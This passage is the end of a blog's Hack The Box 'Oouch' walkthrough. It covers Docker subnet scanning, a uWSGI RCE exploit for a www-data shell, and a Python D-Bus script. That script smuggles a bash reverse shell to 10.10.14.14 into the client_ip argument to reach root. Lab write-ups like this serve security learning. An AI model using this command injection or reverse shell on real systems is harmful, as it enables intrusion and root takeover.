        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#qtc---www-data" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>In the home directory we find a note:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/qtc_note.png" alt="" />
  <figcaption>Note in home directory</figcaption>
  
  </figure>
<p>This talks about an Intrusion Prevention System being implemented using DBus an iptables. This might be what was blocking us earlier when we tried XSS in the contact form.</p>
<p>Since the note mentionned DBUS, let&rsquo;s look at the configuration files of the different registered services. Going under <code>/etc/dbus-1/system.d/</code>, we find the following:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/dbus_htb_oouch.png" alt="" />
  <figcaption>htb.oouch.Block&rsquo;s config file</figcaption>
  
  </figure>
<p>This is the configuration file of the service named: <code>htb.oouch.Block</code>. Let&rsquo;s look at its content:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span> <span class="c">&lt;!-- -*- XML -*- --&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE busconfig PUBLIC
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;busconfig&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;htb.oouch.Block&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;www-data&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;htb.oouch.Block&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;allow</span> <span class="na">receive_sender=</span><span class="s">&#34;htb.oouch.Block&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/busconfig&gt;</span>
</span></span></code></pre></div><p>This tells us that the root user owns this service (running as root) and also that <code>www-data</code> is allowed to send and receive messages to and from this service.</p>
<p>When we try to look for the website&rsquo;s root directory we cannot find it on the host, <code>/var/www</code> doesn&rsquo;t exist.</p>
<p>Looking at the different network interfaces, we see that there might docker containers running on the host:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/docker_subnets.png" alt="" />
  <figcaption>Docker subnets</figcaption>
  
  </figure>
<p>We can use this bash oneliner to do a ping sweep on the different subnets:</p>
<blockquote>
<p>Since docker assigns IPs from the beginning, we can just ping the first 10</p></blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..10<span class="o">}</span><span class="p">;</span><span class="k">do</span> ping -c <span class="m">1</span> -W <span class="m">1</span> 172.18.0.<span class="nv">$i</span> &gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;172.18.0.</span><span class="nv">$i</span><span class="s2">: up&#34;</span><span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div>
<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/ping_sweep_results.png" alt="" />
  <figcaption>Ping sweep results</figcaption>
  
  </figure>
<p>We see that 2,3,4 and 5 are up. Let&rsquo;s see which one is running the website on <code>:5000</code>. For that we can use this command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>2..5<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> &gt; /dev/tcp/172.18.0.<span class="nv">$i</span>/5000 <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;172.18.0.</span><span class="nv">$i</span><span class="s2">:5000 open&#34;</span><span class="p">;</span> <span class="k">done</span>
</span></span></code></pre></div>
<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/5000_pscan.png" alt="" />
  <figcaption>:5000 port scan results</figcaption>
  
  </figure>
<p>We see that port 5000 is opened on <code>172.18.0.4</code>, which means it&rsquo;s probably the container that is running the consumer website. We also notice that port 22 is also opened:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/ssh_port_open_docker.png" alt="" />
  <figcaption>Port 22 also opened</figcaption>
  
  </figure>
<p>We can directly ssh into the container with our user <code>qtc</code>:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/ssh_docker.png" alt="" />
  <figcaption>SSH access in docker container</figcaption>
  
  </figure>
<p>Looking around the filesystem, we see a <code>/code</code> directory:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/code_directory.png" alt="" />
  <figcaption>/code directory</figcaption>
  
  </figure>
<p>In <code>/code/oouch/routes.py</code>, this part catches our attention:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># First apply our primitive xss filter</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">primitive_xss</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">textfield</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="o">.</span><span class="n">SystemBus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="o">.</span><span class="n">get_object</span><span class="p">(</span><span class="s1">&#39;htb.oouch.Block&#39;</span><span class="p">,</span> <span class="s1">&#39;/htb/oouch/Block&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="o">.</span><span class="n">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="s1">&#39;htb.oouch.Block&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">client_ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="o">.</span><span class="n">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bus</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;hacker.html&#39;</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="s1">&#39;Hacker&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>This code snippet checks if the content of the text field (the one in the contact page) contains an XSS. If so, it will call the method <code>Block()</code> from the <code>htb.oouch.Block</code> interface by passing it the client IP address as a parameter. Depending on how the <code>client_ip</code> is handle, this could lead to an injection somewhere.</p>
<p>However we cannot test for it now since we&rsquo;re the user <code>qtc</code> and we need to be <code>www-data</code> in order to interact with that service and call the <code>Block()</code> method.</p>
<p>Looking further in the <code>/code</code> directory, we see the <code>uwsgi.ini</code> file suggesting that the applicaiton is using uWSGI which serves as an interface between web servers (like Nginx, Apache) and Python web applications/frameworks (like Django, Flask).</p>
<p>Searching for uwsgi exploits, we find <a
  href="https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py"
    target="_blank"
  >this one</a> which is an RCE. This will likely get us a shell as <code>www-data</code>.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  
  >
  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    
    >
    <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span>
  </span>

  <span
    
      class="dark:text-neutral-300"
    
    >You will need to remove &ldquo;import bytes&rdquo; on line 18</span>
</div>


<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/rce_www_data.png" alt="" />
  <figcaption>RCE as www-data</figcaption>
  
  </figure>
<p>Using this we can get a reverse shell as www-data:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/www_data_revshell.png" alt="" />
  <figcaption>Reverse shell as www-data</figcaption>
  
  </figure>
<p>Now that we have a shell as <code>www-data</code>, we can use the following python script to see if there is a command injection vulnerability:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;/usr/lib/python3/dist-packages&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">dbus</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="o">.</span><span class="n">SystemBus</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="o">.</span><span class="n">get_object</span><span class="p">(</span><span class="s1">&#39;htb.oouch.Block&#39;</span><span class="p">,</span> <span class="s1">&#39;/htb/oouch/Block&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="o">.</span><span class="n">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="s1">&#39;htb.oouch.Block&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">client_ip</span> <span class="o">=</span> <span class="s1">&#39;; bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.14/1338 0&gt;&amp;1&#34; //&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="o">.</span><span class="n">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bus</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>The first two lines were added to tell the script where to find the dbus package</p>
<p>If we run it without, we&rsquo;ll get the following error:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/dbus_import_error.png" alt="" />
  <figcaption>dbus import error</figcaption>
  
  </figure>
<p>After running it, we get a shell as root and can retrieve the root flag:</p>

<figure>
      <img class="my-0 rounded-md" src="/img/htb/oouch/root_flag.png" alt="" />
  <figcaption>Root flag obtained !</figcaption>
  
  </figure>

          
          
          
        </div>
        
        

        

        
  
  
    <h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2>
    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
      
        
<div
  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  <a
    
  href="/htb/passage/"
    class="absolute inset-0"
    aria-label="HTB - Passage"></a>
        
          <div
            class="thumbnail_card_related nozoom w-full"
            style="background-image:url(/htb/passage/featured_hu_4bcb5408fa06c9c8.png);"></div>
        
      
  <div class="px-6 py-4">
    
      <div
        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
        HTB - Passage
      </div>
    
    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-04-27T00:00:00&#43;00:00">27 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>713 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ctf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ctf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/htb/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Htb
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/web/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/cutenews/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Cutenews
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/cms/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Cms
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/rce/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Rce
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/hashcat/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Hashcat
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/password-reuse/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Password Reuse
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/vim/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Vim
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/vim-history/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Vim History
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/dbus/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Dbus
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



    </div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</div>

      
        
<div
  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  <a
    
  href="/htb/tenet/"
    class="absolute inset-0"
    aria-label="HTB - Tenet"></a>
        
          <div
            class="thumbnail_card_related nozoom w-full"
            style="background-image:url(/htb/tenet/featured_hu_5ddcfeada3252c3b.png);"></div>
        
      
  <div class="px-6 py-4">
    
      <div
        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
        HTB - Tenet
      </div>
    
    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-04-27T00:00:00&#43;00:00">27 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1169 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ctf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ctf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/htb/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Htb
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/web/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Web
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/cms/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Cms
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/wordpress/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Wordpress
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/deserialisation/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Deserialisation
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/race-condition/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Race Condition
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



    </div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</div>

      
        
<div
  class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
  <a
    
  href="/htb/ctf/"
    class="absolute inset-0"
    aria-label="HTB - CTF"></a>
        
          <div
            class="thumbnail_card_related nozoom w-full"
            style="background-image:url(/htb/ctf/featured_hu_ae745e69d3f3988c.png);"></div>
        
      
  <div class="px-6 py-4">
    
      <div
        class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
        HTB - CTF
      </div>
    
    <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
      







  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-04-30T00:00:00&#43;00:00">30 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1686 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">8 mins</span>
    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ctf/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ctf
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/htb/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Htb
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ldap/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ldap
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/ldap-injection/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ldap Injection
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/otp/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Otp
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/otp-generation/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Otp Generation
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/cron/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Cron
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/7z/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    7z
  </span>
</span>
</a
              >
            
              <a class="relative mt-[0.5rem] mr-2" href="/tags/7zip/"
                ><span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    7zip
  </span>
</span>
</a
              >
            
          
        
      
    </div>
  

  
  



    </div>
    
  </div>
  <div class="px-6 pt-4 pb-2"></div>
</div>

      
    </section>
  


      </div>

      
      
        
        
          
          
        
        
        
        <script
          type="text/javascript"
          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
          data-oid="views_htb/oouch/index.md"
          data-oid-likes="likes_htb/oouch/index.md"></script>
      
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/htb/ctf/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HTB - CTF</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2025-04-30T00:00:00&#43;00:00">30 April 2025</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
  <a
    href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
          
          
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
        <ul class="flex list-none flex-col sm:flex-row">
          
            <li class=" flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/tags/"
                title="Tags">
                
                Tags
              </a>
            </li>
          
            <li class=" flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/categories/"
                title="Categories">
                
                Categories
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2025
          squ4r00t
      </p>
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
  <script
    type="text/javascript"
    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
